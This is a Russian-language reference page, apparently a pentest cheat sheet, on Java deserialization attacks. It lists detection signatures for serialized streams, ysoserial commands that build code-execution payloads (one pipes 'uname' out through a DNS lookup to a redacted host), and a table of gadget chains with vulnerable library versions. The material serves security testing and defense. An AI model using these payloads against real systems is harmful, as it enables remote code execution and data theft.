# Десериализация Java

> Сериализация Java — это процесс преобразования состояния объекта Java в поток байтов, который можно сохранить или передать, а затем восстановить (десериализовать) обратно в исходный объект.
>> Сериализация в Java в основном выполняется с помощью интерфейса Serializable, который помечает класс как сериализуемый, что позволяет сохранять его в файлы, отправлять по сети или передавать между виртуальными машинами Java.

Обнаружение
Инструменты
Ysoserial
Расширения Burp с использованием ysoserial
Альтернативные инструменты
Десериализация YAML
ViewState
Ссылки

# Обнаружение

* "AC ED 00 05" в шестнадцатеричном формате
  * AC ED: STREAM_MAGIC. Указывает, что это протокол сериализации.
  * 00 05: STREAM_VERSION. Версия сериализации.
* "rO0" в Base64
* Content-Type = "application/x-java-serialized-object"
* "H4sIAAAAAAAAAJ" в gzip(base64)

# Инструменты

* **Ysoserial**

[frohoff/ysoserial](https://github.com/frohoff/ysoserial): инструмент для экспериментальной генерации полезных данных, использующих небезопасную десериализацию объектов Java.

```
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[удалено]' | gzip | base64
```

* Список полезных данных, включённых в ysoserial

| Нагрузка | Автор | Зависимости |
|----------|-------|-------------|
| AspectJWeaver | @Jang | aspectjweaver:1.9.2, commons-collections:3.2.2 |
| BeanShell1 | @pwntester, @cschneider4711 | bsh:2.0b5 |
| C3P0 | @mbechler | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
| Click1 | @artsploit | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
| Clojure | @JackOfMostTrades | clojure:1.8.0 |
| CommonsBeanutils1 | @frohoff | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
| CommonsCollections1 | @frohoff | commons-collections:3.1 |
| CommonsCollections2 | @frohoff | commons-collections4:4.0 |
| CommonsCollections3 | @frohoff | commons-collections:3.1 |
| CommonsCollections4 | @frohoff | commons-collections4:4.0 |
| CommonsCollections5 | @matthias_kaiser, @jasinner | commons-collections:3.1 |
| CommonsCollections6 | @matthias_kaiser | commons-collections:3.1 |
| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1 |
| FileUpload1 | @mbechler | commons-fileupload:1.3.1, commons-io:2.4 |
| Groovy1 | @frohoff | groovy:2.3.9 |
| Hibernate1 | @mbechler |  |
| Hibernate2 | @mbechler |  |
| JBossInterceptors1 | @matthias_kaiser | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| JRMPClient | @mbechler |  |
| JRMPListener | @mbechler |  |
| JSON1 | @mbechler | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| JavassistWeld1 | @matthias_kaiser | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| Jdk7u21 | @frohoff |  |
| Jython1 | @pwntester, @cschneider4711 | jython-standalone:2.5.2 |
| MozillaRhino1 | @matthias_kaiser | js:1.7R2 |
| MozillaRhino2 | @_tint0 | js:1.7R2 |
| Myfaces1 | @mbechler |  |
| Myfaces2 | @mbechler |  |
| ROME | @mbechler | rome:1.0 |
| Spring1 | @frohoff | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |
| Spring2 | @mbechler | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |
| URLDNS | @gebl |  |
| Vaadin1 | @kai_ullrich | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
| Wicket1 | @jacob-baines | wicket-util:6.23.0, slf4j-api:1.6.4 |
